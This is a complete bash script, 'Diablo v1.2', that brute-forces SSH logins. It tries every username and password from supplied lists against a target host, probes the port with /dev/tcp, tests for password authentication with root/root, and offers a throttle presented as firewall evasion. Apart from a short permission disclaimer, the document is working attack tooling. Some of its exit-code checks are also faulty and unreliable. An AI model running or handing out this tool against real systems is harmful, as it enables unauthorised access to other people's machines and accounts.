#!/usr/bin/env bash

# Diablo v1.2 Parallel SSH bruteforce login hacker - Faster than Hydra!
# This is free software: you are free to change it and redistribute it.
# If running this script in X, type 'unset DISPLAY' in terminal to avoid SSH authentication popup box.
# Please install sshpass before running this script. It is required by this script.
# Please do not abuse this tool. Use it on your own network or on networks you have permission to test.

SECONDS=0

function usage {
echo "Usage:  ./diablo.sh [-upPtTvVih] [options]"
echo "  -u  Path to list containing usernames"
echo "  -p  Path to list containing passwords"
echo "  -t  IP address of the target machine"
echo "  -P  Specify the SSH port to use: Default is port 22"
echo "  -v  Verbose mode - show probes"
echo "  -V  Verbose mode - Show password attempts"
echo "  -c  Continue attack - after first login found."
echo "  -s  Speed of attack. Firewall evasion technique."
echo "      Use 0 to increase speed, 0.2 or > to slow down attack."
echo "  -T  Show elapsed time after the attack"
echo "  -i  Show version info"
echo "  -h  Show help"
}

function version {
echo Diablo v1.2 Parallel SSH bruteforce login hacker.
}

function get_time {
   printf "Finished in $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec\n"
}

function get_args {
   [ $# -eq 0 ] && usage && exit
   while getopts ":u:t:p:P:Tvcs:Vih" arg; do
   case $arg in
   u) users="$OPTARG" ;;
   t) ip="$OPTARG" ;;
   p) passlist="$OPTARG" ;;
   P) port="$OPTARG" ;;
   T) time=1 ;;
   c) continue=1;;
   V) verbose=1;;
   v) verbose2=1;;
   s) speed="$OPTARG";;
   i) version
exit;;
   h) usage
   exit;;
   esac
   done
}


function check_args {
   if [ -z "$ip" ]; then
   echo "Use -t to specify IP address of remote host."
   exit
   fi
   if [ -z "$users" ]; then
   echo "Use -u to specify the path to your username list."
   exit
   fi
   if [ -z "$passlist" ]; then
   echo "Use -p to specify the path to your password file."
   exit
   fi
   if [ -z "$port" ]; then port="22" 
   fi
   if [ -z "$speed" ]; then speed="0.1"
   fi
}


# Check to see if the specified port on the remote host is open.
function port_probe {
   if [[ $verbose2 == 1 ]];then 
   printf "Probing port $port: "
   if (echo >/dev/tcp/$ip/$port) > /dev/null 2>&1; then echo Port is open
   else echo Port $port is closed. && exit
   fi
   else
   if (echo >/dev/tcp/$ip/$port) > /dev/null 2>&1; then echo 0 > /dev/null
   else echo Port $port is closed on the remote host. && exit
   fi; fi
}

# Check to see if the remote host supports password authentication.
function check_auth {
   if [[ $verbose2 == 1 ]]; then 
   printf "Checking for password authentication support: "
   sshpass -p root ssh -q -o connecttimeout=5 -p $port root@$ip exit 2>&1; rval="$?"
   if [ "$rval" == "0" ]; then echo Found login for $ip Username:$users Password:$passwd && exit
   elif [ "$rval" == 255 ]; then echo Failed. && exit
   else echo OK
   fi
   else
   sshpass -p root ssh -q -o connecttimeout=5 -p $port root@$ip exit 2>&1; rval="$?"
   if [ "$rval" == "0" ]; then echo Found login for $ip Username:$users Password:$passwd && exit
   elif [ "$rval" == 255 ]; then echo Remote host does not support password authentication. && exit
   fi; fi
}

# If the remote host supports password authentication, then begin the attack.
function crack_ssh {
   echo Launching attack against $ip:
   for users in `cat $users`; do
   for passwd in  `cat $passlist`; do
   sleep "$speed"
   if [[ $verbose == 1 ]]; then echo Trying username $users and password $passwd; else echo 0 > /dev/null; fi
   response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p $port $users@$ip echo 0 2>&1)
   [ $? == 0 ] && echo Found login for $ip  Username:$users Password:$passwd
   if [[ $continue != 1 && $? == 0 ]]; then break; fi
   while [ $? == 255 ] || [ $? == 3 ]; do
   response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p $port $users@$ip echo 0 2>&1)
   [ $? == 0 ] && echo Found login for $ip  Username:$users Password:$passwd
   if [[ $continue != 1 && $? == 0 ]]; then break; fi
   done
   done
   done
}

get_args $@
check_args
port_probe
check_auth
crack_ssh &
wait
if [[ $time == 1 ]]; then get_time; fi